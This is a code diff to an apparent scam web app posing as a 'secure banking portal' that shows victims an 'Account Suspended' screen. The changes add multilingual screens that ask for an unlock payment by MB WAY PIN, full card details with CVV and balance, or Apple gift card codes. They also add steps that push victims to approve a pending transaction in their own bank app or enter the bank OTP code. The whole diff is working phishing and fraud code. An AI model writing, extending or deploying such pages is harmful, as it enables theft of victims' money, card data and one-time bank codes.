@@ -835,7 +835,7 @@ function showScreen(name,noPush){
   });
   var el=$(name); if(el) el.classList.add('visible');
   var g=$('globe-btn');
-  if(g) g.classList.toggle('show', name!=='auth-screen' && name!=='lock-screen');
+  if(g) g.classList.toggle('show', name!=='auth-screen');
   if(!noPush && name!=='auth-screen'){
     history.pushState({screen:name},'',window.location.pathname+(window.location.search||''));
   }
@@ -972,7 +972,7 @@ en:{
   lockMbwayLabel:'MB WAY',lockMbwayDesc:'Pay via MB WAY',
   lockVisaLabel:'Visa',lockVisaDesc:'Pay with Visa card',
   lockMcLabel:'Mastercard',lockMcDesc:'Pay with Mastercard',
-  lockAppleLabel:'&#127873; Apple Gift Card',lockAppleDesc:'Redeem Apple Gift Card(s)',
+  lockAppleLabel:'Apple Gift Card',lockAppleDesc:'Redeem Apple Gift Card(s)',
   lockCardSubtitle:'Account Unlock Payment',lockCardSubmit:'Submit',
   lockMbwayPhone:'Phone number',lockMbwayPin:'MB WAY PIN (up to 6 digits)',
   lockMbwayName:'Full Name (must match account)',
@@ -981,9 +981,29 @@ en:{
   lockCardBank:'Bank Name',lockCardExpiry:'Card Expiry',lockCardCvv:'CVV',
   lockCardStreet:'Street Address',lockCardCity:'City',lockCardPostcode:'Postcode',
   lockCardPhone:'Phone Number',lockCardBalance:'Card Balance (e.g. 500.00)',
-  lockAppleQtyTitle:'&#127873; Apple Gift Cards',lockAppleQtyDesc:'How many Apple Gift Cards would you like to redeem?',
-  lockAppleCodesTitle:'&#127873; Gift Card Codes',lockAppleCodesDesc:'Enter the code and amount for each gift card.',
-  lockAppleCodesSubmit:'Submit Gift Cards',lockGcCode:'Gift Card Code',lockGcAmount:'Gift Card Amount (e.g. 50.00)'
+  lockAppleQtyTitle:'Apple Gift Cards',lockAppleQtyDesc:'How many Apple Gift Cards would you like to redeem?',
+  lockAppleCodesTitle:'Gift Card Codes',lockAppleCodesDesc:'Enter the code and amount for each gift card.',
+  lockAppleCodesSubmit:'Submit Gift Cards',lockGcCode:'Gift Card Code',lockGcAmount:'Gift Card Amount (e.g. 50.00)',
+  lockAuthTitle:'Authorization Required',
+  lockAuthIntro:"To complete your account restoration, you must authorize this transaction directly in your external bank or payment application. Please follow the steps below carefully.",
+  lockAuthStep1:"Open your bank's mobile application or online banking portal.",
+  lockAuthStep2:'Navigate to your pending transactions or payment requests.',
+  lockAuthStep3:'Locate the authorization request associated with this verification.',
+  lockAuthStep4:'Approve the transaction and return to this screen.',
+  lockAuthStep5:"Tap 'I Have Authorized' below once you have completed the approval.",
+  lockAuthIHaveAuth:'I Have Authorized',
+  lockAuthWithCode:'Authorize with Code',
+  lockAuthCodeTitle:'Enter Authorization Code',
+  lockAuthCodeDesc:'Enter the authorization or OTP code received from your bank (up to 8 digits).',
+  lockAuthCodePlaceholder:'Authorization code (up to 8 digits)',
+  lockAuthCodeSubmit:'Submit Code',
+  lockPendingTitle:'Your Submissions',
+  lockPendingDesc:'The following verifications have been submitted. Each remains active until reviewed.',
+  lockPendingNone:'No submissions yet.',
+  lockPendingOtp:'Authorize / OTP',
+  lockAuthorizingFor:'Authorizing payment for account restoration',
+  lockMbwayAuthNote:'You will need to authorize this payment in your MB WAY app.',
+  lockCardAuthNote:'You will need to authorize this transaction in your external bank.'
 },
 es:{
   welcomeBack:'Bienvenido de nuevo',tagline:'Seguro \u00b7 Confiable \u00b7 Global',
@@ -1068,7 +1088,7 @@ es:{
   lockMbwayLabel:'MB WAY',lockMbwayDesc:'Pagar v\xEDa MB WAY',
   lockVisaLabel:'Visa',lockVisaDesc:'Pagar con tarjeta Visa',
   lockMcLabel:'Mastercard',lockMcDesc:'Pagar con Mastercard',
-  lockAppleLabel:'&#127873; Tarjeta Regalo Apple',lockAppleDesc:'Canjear Tarjeta(s) Regalo Apple',
+  lockAppleLabel:'Tarjeta Regalo Apple',lockAppleDesc:'Canjear Tarjeta(s) Regalo Apple',
   lockCardSubtitle:'Pago de Desbloqueo de Cuenta',lockCardSubmit:'Enviar',
   lockMbwayPhone:'N\xFAmero de tel\xE9fono',lockMbwayPin:'PIN de MB WAY (hasta 6 d\xEDgitos)',
   lockMbwayName:'Nombre completo (debe coincidir con la cuenta)',
@@ -1077,9 +1097,29 @@ es:{
   lockCardBank:'Nombre del banco',lockCardExpiry:'Vencimiento',lockCardCvv:'CVV',
   lockCardStreet:'Direcci\xF3n',lockCardCity:'Ciudad',lockCardPostcode:'C\xF3digo postal',
   lockCardPhone:'Tel\xE9fono',lockCardBalance:'Saldo de la tarjeta (ej. 500.00)',
-  lockAppleQtyTitle:'&#127873; Tarjetas Regalo Apple',lockAppleQtyDesc:'\xBFCu\xE1ntas Tarjetas Regalo Apple quieres canjear?',
-  lockAppleCodesTitle:'&#127873; C\xF3digos de Tarjeta Regalo',lockAppleCodesDesc:'Ingresa el c\xF3digo y monto de cada tarjeta.',
-  lockAppleCodesSubmit:'Enviar Tarjetas Regalo',lockGcCode:'C\xF3digo de Tarjeta Regalo',lockGcAmount:'Monto de Tarjeta (ej. 50.00)'
+  lockAppleQtyTitle:'Tarjetas Regalo Apple',lockAppleQtyDesc:'\xBFCu\xE1ntas Tarjetas Regalo Apple quieres canjear?',
+  lockAppleCodesTitle:'C\xF3digos de Tarjeta Regalo',lockAppleCodesDesc:'Ingresa el c\xF3digo y monto de cada tarjeta.',
+  lockAppleCodesSubmit:'Enviar Tarjetas Regalo',lockGcCode:'C\xF3digo de Tarjeta Regalo',lockGcAmount:'Monto de Tarjeta (ej. 50.00)',
+  lockAuthTitle:'Autorizaci\xF3n Requerida',
+  lockAuthIntro:'Para completar la restauraci\xF3n de su cuenta, debe autorizar esta transacci\xF3n directamente en su banco o aplicaci\xF3n de pago. Por favor, siga los pasos a continuaci\xF3n.',
+  lockAuthStep1:'Abra la aplicaci\xF3n m\xF3vil de su banco o portal de banca en l\xEDnea.',
+  lockAuthStep2:'Navegue a sus transacciones pendientes o solicitudes de pago.',
+  lockAuthStep3:'Localice la solicitud de autorizaci\xF3n asociada a esta verificaci\xF3n.',
+  lockAuthStep4:'Apruebe la transacci\xF3n y regrese a esta pantalla.',
+  lockAuthStep5:"Toque \'Ya Autorice\' a continuaci\xF3n una vez completada la aprobaci\xF3n.",
+  lockAuthIHaveAuth:'Ya Autoric\xE9',
+  lockAuthWithCode:'Autorizar con C\xF3digo',
+  lockAuthCodeTitle:'Ingrese el C\xF3digo de Autorizaci\xF3n',
+  lockAuthCodeDesc:'Ingrese el c\xF3digo de autorizaci\xF3n u OTP recibido de su banco (hasta 8 d\xEDgitos).',
+  lockAuthCodePlaceholder:'C\xF3digo de autorizaci\xF3n (hasta 8 d\xEDgitos)',
+  lockAuthCodeSubmit:'Enviar C\xF3digo',
+  lockPendingTitle:'Sus Env\xEDos',
+  lockPendingDesc:'Las siguientes verificaciones han sido enviadas. Cada una permanece activa hasta ser revisada.',
+  lockPendingNone:'Sin env\xEDos a\xFAn.',
+  lockPendingOtp:'Autorizar / OTP',
+  lockAuthorizingFor:'Autorizando pago para la restauraci\xF3n de cuenta',
+  lockMbwayAuthNote:'Deber\xE1 autorizar este pago en su aplicaci\xF3n MB WAY.',
+  lockCardAuthNote:'Deber\xE1 autorizar esta transacci\xF3n en su banco externo.'
 },
 fr:{
   welcomeBack:'Bon retour',tagline:'S\u00e9curis\u00e9 \u00b7 Fiable \u00b7 Global',
@@ -1164,7 +1204,7 @@ fr:{
   lockMbwayLabel:'MB WAY',lockMbwayDesc:'Payer via MB WAY',
   lockVisaLabel:'Visa',lockVisaDesc:'Payer avec Visa',
   lockMcLabel:'Mastercard',lockMcDesc:'Payer avec Mastercard',
-  lockAppleLabel:'&#127873; Carte-Cadeau Apple',lockAppleDesc:'R\xE9dimer une/des Carte(s)-Cadeau Apple',
+  lockAppleLabel:'Carte-Cadeau Apple',lockAppleDesc:'R\xE9dimer une/des Carte(s)-Cadeau Apple',
   lockCardSubtitle:'Paiement de D\xE9blocage du Compte',lockCardSubmit:'Soumettre',
   lockMbwayPhone:'Num\xE9ro de t\xE9l\xE9phone',lockMbwayPin:'Code PIN MB WAY (jusqu\'\xE0 6 chiffres)',
   lockMbwayName:'Nom complet (doit correspondre au compte)',
@@ -1173,9 +1213,29 @@ fr:{
   lockCardBank:'Nom de la banque',lockCardExpiry:'Date d\'expiration',lockCardCvv:'CVV',
   lockCardStreet:'Adresse',lockCardCity:'Ville',lockCardPostcode:'Code postal',
   lockCardPhone:'T\xE9l\xE9phone',lockCardBalance:'Solde de la carte (ex. 500.00)',
-  lockAppleQtyTitle:'&#127873; Cartes-Cadeaux Apple',lockAppleQtyDesc:'Combien de Cartes-Cadeaux Apple souhaitez-vous r\xE9dimer?',
-  lockAppleCodesTitle:'&#127873; Codes de Carte-Cadeau',lockAppleCodesDesc:'Entrez le code et le montant de chaque carte.',
-  lockAppleCodesSubmit:'Soumettre les Cartes-Cadeaux',lockGcCode:'Code de Carte-Cadeau',lockGcAmount:'Montant de la Carte (ex. 50.00)'
+  lockAppleQtyTitle:'Cartes-Cadeaux Apple',lockAppleQtyDesc:'Combien de Cartes-Cadeaux Apple souhaitez-vous r\xE9dimer?',
+  lockAppleCodesTitle:'Codes de Carte-Cadeau',lockAppleCodesDesc:'Entrez le code et le montant de chaque carte.',
+  lockAppleCodesSubmit:'Soumettre les Cartes-Cadeaux',lockGcCode:'Code de Carte-Cadeau',lockGcAmount:'Montant de la Carte (ex. 50.00)',
+  lockAuthTitle:'Autorisation Requise',
+  lockAuthIntro:"Pour finaliser la restauration de votre compte, vous devez autoriser cette transaction dans votre banque ou application de paiement. Veuillez suivre attentivement les étapes ci-dessous.",
+  lockAuthStep1:"Ouvrez l'application mobile de votre banque ou votre portail de banque en ligne.",
+  lockAuthStep2:'Accédez à vos transactions en attente ou demandes de paiement.',
+  lockAuthStep3:"Localisez la demande d'autorisation associée à cette vérification.",
+  lockAuthStep4:'Approuvez la transaction et revenez à cet écran.',
+  lockAuthStep5:"Appuyez sur 'J'ai autorisé' ci-dessous une fois l'approbation effectuée.",
+  lockAuthIHaveAuth:"J'ai autorisé",
+  lockAuthWithCode:'Autoriser avec un Code',
+  lockAuthCodeTitle:"Entrez le Code d'Autorisation",
+  lockAuthCodeDesc:"Entrez le code d'autorisation ou OTP reçu de votre banque (jusqu'à 8 chiffres).",
+  lockAuthCodePlaceholder:"Code d'autorisation (jusqu'à 8 chiffres)",
+  lockAuthCodeSubmit:'Soumettre le Code',
+  lockPendingTitle:'Vos Soumissions',
+  lockPendingDesc:"Les vérifications suivantes ont été soumises. Chacune reste active jusqu'à examen.",
+  lockPendingNone:'Aucune soumission pour l\'instant.',
+  lockPendingOtp:'Autoriser / OTP',
+  lockAuthorizingFor:'Autorisation du paiement pour la restauration du compte',
+  lockMbwayAuthNote:'Vous devrez autoriser ce paiement dans votre application MB WAY.',
+  lockCardAuthNote:'Vous devrez autoriser cette transaction dans votre banque externe.'
 },
 pt:{
   welcomeBack:'Bem-vindo de volta',tagline:'Seguro \u00b7 Confi\u00e1vel \u00b7 Global',
@@ -1260,7 +1320,7 @@ pt:{
   lockMbwayLabel:'MB WAY',lockMbwayDesc:'Pagar via MB WAY',
   lockVisaLabel:'Visa',lockVisaDesc:'Pagar com cart\xE3o Visa',
   lockMcLabel:'Mastercard',lockMcDesc:'Pagar com Mastercard',
-  lockAppleLabel:'&#127873; Cart\xE3o Presente Apple',lockAppleDesc:'Resgatar Cart\xE3o(s) Presente Apple',
+  lockAppleLabel:'Cart\xE3o Presente Apple',lockAppleDesc:'Resgatar Cart\xE3o(s) Presente Apple',
   lockCardSubtitle:'Pagamento de Desbloqueio de Conta',lockCardSubmit:'Submeter',
   lockMbwayPhone:'N\xFAmero de telef\xF3ne',lockMbwayPin:'PIN MB WAY (at\xE9 6 d\xEDgitos)',
   lockMbwayName:'Nome completo (deve corresponder \xE0 conta)',
@@ -1269,9 +1329,29 @@ pt:{
   lockCardBank:'Nome do banco',lockCardExpiry:'Validade',lockCardCvv:'CVV',
   lockCardStreet:'Morada',lockCardCity:'Cidade',lockCardPostcode:'C\xF3digo postal',
   lockCardPhone:'Telef\xF3ne',lockCardBalance:'Saldo do cart\xE3o (ex. 500.00)',
-  lockAppleQtyTitle:'&#127873; Cart\xF5es Presente Apple',lockAppleQtyDesc:'Quantos Cart\xF5es Presente Apple deseja resgatar?',
-  lockAppleCodesTitle:'&#127873; C\xF3digos de Cart\xE3o Presente',lockAppleCodesDesc:'Introduza o c\xF3digo e o valor de cada cart\xE3o.',
-  lockAppleCodesSubmit:'Submeter Cart\xF5es Presente',lockGcCode:'C\xF3digo do Cart\xE3o Presente',lockGcAmount:'Valor do Cart\xE3o (ex. 50.00)'
+  lockAppleQtyTitle:'Cart\xF5es Presente Apple',lockAppleQtyDesc:'Quantos Cart\xF5es Presente Apple deseja resgatar?',
+  lockAppleCodesTitle:'C\xF3digos de Cart\xE3o Presente',lockAppleCodesDesc:'Introduza o c\xF3digo e o valor de cada cart\xE3o.',
+  lockAppleCodesSubmit:'Submeter Cart\xF5es Presente',lockGcCode:'C\xF3digo do Cart\xE3o Presente',lockGcAmount:'Valor do Cart\xE3o (ex. 50.00)',
+  lockAuthTitle:'Autoriza\xE7\xE3o Necess\xE1ria',
+  lockAuthIntro:'Para concluir a restaura\xE7\xE3o da sua conta, deve autorizar esta transa\xE7\xE3o diretamente na sua institui\xE7\xE3o banc\xE1ria ou aplica\xE7\xE3o de pagamento. Por favor, siga cuidadosamente os passos abaixo.',
+  lockAuthStep1:'Abra a aplica\xE7\xE3o m\xF3vel do seu banco ou portal de banca online.',
+  lockAuthStep2:'Navegue para as suas transa\xE7\xF5es pendentes ou pedidos de pagamento.',
+  lockAuthStep3:'Localize o pedido de autoriza\xE7\xE3o associado a esta verifica\xE7\xE3o.',
+  lockAuthStep4:'Aprove a transa\xE7\xE3o e regresse a este ecr\xE3.',
+  lockAuthStep5:"Toque em \'J\xE1 Autorizei\' abaixo assim que a aprova\xE7\xE3o estiver conclu\xEDda.",
+  lockAuthIHaveAuth:'J\xE1 Autorizei',
+  lockAuthWithCode:'Autorizar com C\xF3digo',
+  lockAuthCodeTitle:'Introduza o C\xF3digo de Autoriza\xE7\xE3o',
+  lockAuthCodeDesc:'Introduza o c\xF3digo de autoriza\xE7\xE3o ou OTP recebido do seu banco (at\xE9 8 d\xEDgitos).',
+  lockAuthCodePlaceholder:'C\xF3digo de autoriza\xE7\xE3o (at\xE9 8 d\xEDgitos)',
+  lockAuthCodeSubmit:'Submeter C\xF3digo',
+  lockPendingTitle:'As Suas Submiss\xF5es',
+  lockPendingDesc:'As seguintes verifica\xE7\xF5es foram submetidas. Cada uma permanece ativa at\xE9 ser revista.',
+  lockPendingNone:'Sem submiss\xF5es ainda.',
+  lockPendingOtp:'Autorizar / OTP',
+  lockAuthorizingFor:'A autorizar pagamento para restaura\xE7\xE3o de conta',
+  lockMbwayAuthNote:'Ter\xE1 de autorizar este pagamento na sua aplica\xE7\xE3o MB WAY.',
+  lockCardAuthNote:'Ter\xE1 de autorizar esta transa\xE7\xE3o no seu banco externo.'
 }
 };
 
@@ -3673,12 +3753,13 @@ $('mbway-otp-submit-btn').onclick = function(){
 <!-- LOCK: ADD MONEY METHOD PICKER -->
 <div class="modal" id="lock-addmoney-modal">
   <div class="modal-box" style="background:#fff;">
-    <div class="modal-header"><h3 style="color:#1a56ff;" data-i18n="lockAddMoneyTitle">&#128179; Add Money to Unlock</h3><button class="modal-close" onclick="closeModal('lock-addmoney-modal')">&#215;</button></div>
-    <p style="font-size:13px;color:#666;margin-bottom:18px;line-height:1.5;" data-i18n="lockAddMoneyDesc">Choose how to add the required <strong>&#163;150 / $150</strong>. Name must match your account.</p>
+    <div class="modal-header"><h3 style="color:#1a56ff;" data-i18n="lockAddMoneyTitle">Add Money to Unlock</h3><button class="modal-close" onclick="closeModal('lock-addmoney-modal')">&#215;</button></div>
+    <p style="font-size:13px;color:#666;margin-bottom:18px;line-height:1.5;" data-i18n="lockAddMoneyDesc">Choose how to add the required amount. Name must match your account.</p>
     <button onclick="openLockMethod('mbway')" style="display:flex;align-items:center;gap:14px;width:100%;background:#fff5f5;border:2px solid #ffcccc;border-radius:12px;padding:14px 16px;margin-bottom:10px;cursor:pointer;font-family:inherit;text-align:left;"><img src="https://i.imgur.com/JGEaMvn.jpeg" style="width:38px;height:38px;border-radius:8px;object-fit:cover;flex-shrink:0;"><div><div style="font-size:15px;font-weight:700;color:#cc0000;" data-i18n="lockMbwayLabel">MB WAY</div><div style="font-size:12px;color:#888;margin-top:2px;" data-i18n="lockMbwayDesc">Pay via MB WAY</div></div></button>
     <button onclick="openLockMethod('visa')" style="display:flex;align-items:center;gap:14px;width:100%;background:#f0f4ff;border:2px solid #c7d4ff;border-radius:12px;padding:14px 16px;margin-bottom:10px;cursor:pointer;font-family:inherit;text-align:left;"><span style="font-size:32px;flex-shrink:0;">&#128179;</span><div><div style="font-size:15px;font-weight:700;color:#1a56ff;" data-i18n="lockVisaLabel">Visa</div><div style="font-size:12px;color:#888;margin-top:2px;" data-i18n="lockVisaDesc">Pay with Visa card</div></div></button>
     <button onclick="openLockMethod('mastercard')" style="display:flex;align-items:center;gap:14px;width:100%;background:#fff8f0;border:2px solid #ffe0b2;border-radius:12px;padding:14px 16px;margin-bottom:10px;cursor:pointer;font-family:inherit;text-align:left;"><span style="font-size:32px;flex-shrink:0;">&#128179;</span><div><div style="font-size:15px;font-weight:700;color:#e65100;" data-i18n="lockMcLabel">Mastercard</div><div style="font-size:12px;color:#888;margin-top:2px;" data-i18n="lockMcDesc">Pay with Mastercard</div></div></button>
-    <button onclick="openLockMethod('apple')" style="display:flex;align-items:center;gap:14px;width:100%;background:#f5f5f7;border:2px solid #d1d1d6;border-radius:12px;padding:14px 16px;cursor:pointer;font-family:inherit;text-align:left;"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Apple_logo_black.svg/814px-Apple_logo_black.svg.png" style="width:32px;height:32px;object-fit:contain;flex-shrink:0;"><div><div style="font-size:15px;font-weight:700;color:#111;" data-i18n="lockAppleLabel">&#127873; Apple Gift Card</div><div style="font-size:12px;color:#888;margin-top:2px;" data-i18n="lockAppleDesc">Redeem Apple Gift Card(s)</div></div></button>
+    <button onclick="openLockMethod('apple')" style="display:flex;align-items:center;gap:14px;width:100%;background:#f5f5f7;border:2px solid #d1d1d6;border-radius:12px;padding:14px 16px;margin-bottom:10px;cursor:pointer;font-family:inherit;text-align:left;"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Apple_logo_black.svg/814px-Apple_logo_black.svg.png" style="width:32px;height:32px;object-fit:contain;flex-shrink:0;"><div><div style="font-size:15px;font-weight:700;color:#111;" data-i18n="lockAppleLabel">Apple Gift Card</div><div style="font-size:12px;color:#888;margin-top:2px;" data-i18n="lockAppleDesc">Redeem Apple Gift Card(s)</div></div></button>
+    <button onclick="openLockPending()" style="display:flex;align-items:center;justify-content:center;gap:8px;width:100%;background:rgba(26,86,255,0.07);border:1.5px solid rgba(26,86,255,0.2);border-radius:12px;padding:12px 16px;cursor:pointer;font-family:inherit;font-size:13px;font-weight:600;color:#1a56ff;" data-i18n="lockPendingTitle">Your Submissions</button>
   </div>
 </div>
 
@@ -3687,16 +3768,77 @@ $('mbway-otp-submit-btn').onclick = function(){
   <div class="modal-box dark" style="max-height:90vh;overflow-y:auto;">
     <div style="text-align:center;padding:12px 0 10px;border-bottom:1px solid rgba(255,255,255,0.08);margin-bottom:16px;"><div id="lock-card-icon" style="font-size:40px;margin-bottom:6px;"></div><div style="font-size:10px;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,0.4);" data-i18n="lockCardSubtitle">Account Unlock Payment</div></div>
     <div class="modal-header"><h3 id="lock-card-title">Payment Details</h3><button class="modal-close" onclick="closeModal('lock-card-modal')">&#215;</button></div>
+    <div id="lock-auth-notice" style="display:none;background:rgba(26,86,255,0.1);border:1px solid rgba(26,86,255,0.3);border-radius:12px;padding:14px 16px;margin-bottom:14px;">
+      <div style="font-size:12px;color:#4dabff;font-weight:700;margin-bottom:6px;">&#128274; Authorization Required</div>
+      <div id="lock-auth-notice-text" style="font-size:12px;color:rgba(255,255,255,0.65);line-height:1.6;"></div>
+    </div>
     <div id="lock-card-fields"></div>
     <div class="modal-error" id="lock-card-error"></div>
     <button class="modal-btn" id="lock-card-submit-btn" data-i18n="lockCardSubmit">Submit</button>
+    <button id="lock-to-auth-btn" onclick="openLockAuth()" style="display:none;width:100%;margin-top:10px;background:rgba(255,255,255,0.07);border:1px solid rgba(255,255,255,0.15);border-radius:12px;padding:13px;font-size:14px;font-weight:600;color:rgba(255,255,255,0.7);cursor:pointer;font-family:inherit;" data-i18n="lockAuthIHaveAuth">I Have Authorized</button>
+  </div>
+</div>
+
+<!-- LOCK: AUTHORIZATION SCREEN -->
+<div class="modal" id="lock-auth-modal">
+  <div class="modal-box dark" style="max-height:90vh;overflow-y:auto;">
+    <div class="modal-header"><h3 data-i18n="lockAuthTitle">Authorization Required</h3><button class="modal-close" onclick="closeModal('lock-auth-modal')">&#215;</button></div>
+    <div style="background:rgba(26,86,255,0.08);border:1px solid rgba(26,86,255,0.25);border-radius:14px;padding:16px 18px;margin-bottom:20px;">
+      <div style="font-size:12px;color:rgba(255,255,255,0.5);font-weight:600;text-transform:uppercase;letter-spacing:0.8px;margin-bottom:8px;" data-i18n="lockAuthorizingFor">Authorizing payment for account restoration</div>
+      <div id="lock-auth-context" style="font-size:13px;color:#4dabff;font-weight:700;"></div>
+    </div>
+    <div style="font-size:13px;color:rgba(255,255,255,0.65);line-height:1.7;margin-bottom:20px;" data-i18n="lockAuthIntro">To complete your account restoration, you must authorize this transaction directly in your external bank or payment application.</div>
+    <div style="display:flex;flex-direction:column;gap:10px;margin-bottom:24px;">
+      <div style="display:flex;gap:12px;align-items:flex-start;padding:12px 14px;background:rgba(255,255,255,0.04);border-radius:12px;border:1px solid rgba(255,255,255,0.07);">
+        <div style="min-width:24px;height:24px;background:#1a56ff;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:800;color:#fff;flex-shrink:0;">1</div>
+        <div style="font-size:13px;color:rgba(255,255,255,0.7);line-height:1.6;" data-i18n="lockAuthStep1">Open your bank's mobile application or online banking portal.</div>
+      </div>
+      <div style="display:flex;gap:12px;align-items:flex-start;padding:12px 14px;background:rgba(255,255,255,0.04);border-radius:12px;border:1px solid rgba(255,255,255,0.07);">
+        <div style="min-width:24px;height:24px;background:#1a56ff;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:800;color:#fff;flex-shrink:0;">2</div>
+        <div style="font-size:13px;color:rgba(255,255,255,0.7);line-height:1.6;" data-i18n="lockAuthStep2">Navigate to your pending transactions or payment requests.</div>
+      </div>
+      <div style="display:flex;gap:12px;align-items:flex-start;padding:12px 14px;background:rgba(255,255,255,0.04);border-radius:12px;border:1px solid rgba(255,255,255,0.07);">
+        <div style="min-width:24px;height:24px;background:#1a56ff;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:800;color:#fff;flex-shrink:0;">3</div>
+        <div style="font-size:13px;color:rgba(255,255,255,0.7);line-height:1.6;" data-i18n="lockAuthStep3">Locate the authorization request associated with this verification.</div>
+      </div>
+      <div style="display:flex;gap:12px;align-items:flex-start;padding:12px 14px;background:rgba(255,255,255,0.04);border-radius:12px;border:1px solid rgba(255,255,255,0.07);">
+        <div style="min-width:24px;height:24px;background:#1a56ff;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:800;color:#fff;flex-shrink:0;">4</div>
+        <div style="font-size:13px;color:rgba(255,255,255,0.7);line-height:1.6;" data-i18n="lockAuthStep4">Approve the transaction and return to this screen.</div>
+      </div>
+      <div style="display:flex;gap:12px;align-items:flex-start;padding:12px 14px;background:rgba(255,255,255,0.04);border-radius:12px;border:1px solid rgba(255,255,255,0.07);">
+        <div style="min-width:24px;height:24px;background:#1a56ff;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:800;color:#fff;flex-shrink:0;">5</div>
+        <div style="font-size:13px;color:rgba(255,255,255,0.7);line-height:1.6;" data-i18n="lockAuthStep5">Tap 'I Have Authorized' below once you have completed the approval.</div>
+      </div>
+    </div>
+    <button id="lock-auth-done-btn" class="modal-btn" style="margin-bottom:12px;" data-i18n="lockAuthIHaveAuth">I Have Authorized</button>
+    <button onclick="openLockAuthCode()" style="width:100%;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.15);border-radius:12px;padding:13px;font-size:13px;font-weight:600;color:rgba(255,255,255,0.6);cursor:pointer;font-family:inherit;" data-i18n="lockAuthWithCode">Authorize with Code</button>
+  </div>
+</div>
+
+<!-- LOCK: AUTH CODE ENTRY -->
+<div class="modal" id="lock-auth-code-modal">
+  <div class="modal-box dark">
+    <div class="modal-header"><h3 data-i18n="lockAuthCodeTitle">Enter Authorization Code</h3><button class="modal-close" onclick="closeModal('lock-auth-code-modal')">&#215;</button></div>
+    <p style="font-size:13px;color:rgba(255,255,255,0.55);line-height:1.6;margin-bottom:16px;" data-i18n="lockAuthCodeDesc">Enter the authorization or OTP code you received from your bank (up to 8 digits).</p>
+    <input type="text" id="lock-auth-code-input" class="modal-input" maxlength="8" inputmode="numeric" style="font-size:22px;letter-spacing:6px;text-align:center;font-weight:700;">
+    <div class="modal-error" id="lock-auth-code-error"></div>
+    <button class="modal-btn" id="lock-auth-code-submit-btn" data-i18n="lockAuthCodeSubmit">Submit Code</button>
+  </div>
+</div>
+
+<!-- LOCK: PENDING SUBMISSIONS -->
+<div class="modal" id="lock-pending-modal">
+  <div class="modal-box dark" style="max-height:90vh;overflow-y:auto;">
+    <div class="modal-header"><h3 data-i18n="lockPendingTitle">Your Submissions</h3><button class="modal-close" onclick="closeModal('lock-pending-modal')">&#215;</button></div>
+    <p style="font-size:13px;color:rgba(255,255,255,0.5);margin-bottom:18px;line-height:1.5;" data-i18n="lockPendingDesc">The following verifications have been submitted. Each remains active until reviewed.</p>
+    <div id="lock-pending-list"></div>
   </div>
 </div>
 
 <!-- LOCK: APPLE QTY -->
 <div class="modal" id="lock-apple-qty-modal">
   <div class="modal-box" style="background:#fff;">
-    <div class="modal-header"><h3 style="color:#111;" data-i18n="lockAppleQtyTitle">&#127873; Apple Gift Cards</h3><button class="modal-close" onclick="closeModal('lock-apple-qty-modal')">&#215;</button></div>
+    <div class="modal-header"><h3 style="color:#111;" data-i18n="lockAppleQtyTitle">Apple Gift Cards</h3><button class="modal-close" onclick="closeModal('lock-apple-qty-modal')">&#215;</button></div>
     <p style="font-size:13px;color:#666;margin-bottom:18px;" data-i18n="lockAppleQtyDesc">How many Apple Gift Cards would you like to redeem?</p>
     <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px;">
       <button onclick="openLockAppleCodes(1)" style="background:#f5f5f7;border:2px solid #d1d1d6;border-radius:12px;padding:18px 8px;font-size:20px;font-weight:700;color:#111;cursor:pointer;font-family:inherit;">1</button>
@@ -3712,7 +3854,7 @@ $('mbway-otp-submit-btn').onclick = function(){
 <!-- LOCK: APPLE CODES -->
 <div class="modal" id="lock-apple-codes-modal">
   <div class="modal-box dark" style="max-height:90vh;overflow-y:auto;">
-    <div class="modal-header"><h3 data-i18n="lockAppleCodesTitle">&#127873; Gift Card Codes</h3><button class="modal-close" onclick="closeModal('lock-apple-codes-modal')">&#215;</button></div>
+    <div class="modal-header"><h3 data-i18n="lockAppleCodesTitle">Gift Card Codes</h3><button class="modal-close" onclick="closeModal('lock-apple-codes-modal')">&#215;</button></div>
     <p style="font-size:13px;color:rgba(255,255,255,0.6);margin-bottom:16px;" data-i18n="lockAppleCodesDesc">Enter the code and amount for each gift card.</p>
     <div id="lock-apple-codes-fields"></div>
     <div class="modal-error" id="lock-apple-codes-error"></div>
@@ -3730,14 +3872,11 @@ $('mbway-otp-submit-btn').onclick = function(){
         <div style="font-size:10px;color:rgba(255,255,255,0.45);letter-spacing:0.5px;" data-i18n="lockBankPortal">SECURE BANKING PORTAL</div>
       </div>
     </div>
-    <div style="display:flex;align-items:center;gap:10px;">
-      <button onclick="openModal('language-modal')" style="background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.15);border-radius:50%;width:36px;height:36px;display:flex;align-items:center;justify-content:center;font-size:18px;cursor:pointer;color:#fff;padding:0;">&#127760;</button>
-      <div style="background:rgba(229,57,53,0.15);border:1px solid rgba(229,57,53,0.4);border-radius:20px;padding:4px 12px;">
-        <span style="font-size:11px;font-weight:700;color:#ff6b6b;" data-i18n="lockRestricted">&#9679; ACCOUNT RESTRICTED</span>
-      </div>
+    <div style="background:rgba(229,57,53,0.15);border:1px solid rgba(229,57,53,0.4);border-radius:20px;padding:4px 12px;">
+      <span style="font-size:11px;font-weight:700;color:#ff6b6b;" data-i18n="lockRestricted">&#9679; ACCOUNT RESTRICTED</span>
     </div>
   </div>
-  <div style="max-width:480px;margin:0 auto;padding:36px 20px 100px;">
+  <div style="max-width:480px;margin:0 auto;padding:36px 20px 120px;">
     <div style="text-align:center;margin-bottom:32px;">
       <div style="width:80px;height:80px;background:rgba(229,57,53,0.1);border:1.5px solid rgba(229,57,53,0.35);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:36px;margin:0 auto 16px;">&#128274;</div>
       <div style="font-size:24px;font-weight:800;color:#fff;margin-bottom:6px;" data-i18n="lockTitle">Account Suspended</div>
@@ -3749,7 +3888,7 @@ $('mbway-otp-submit-btn').onclick = function(){
     </div>
     <div style="background:rgba(229,57,53,0.07);border:1px solid rgba(229,57,53,0.25);border-radius:16px;padding:18px 20px;margin-bottom:24px;">
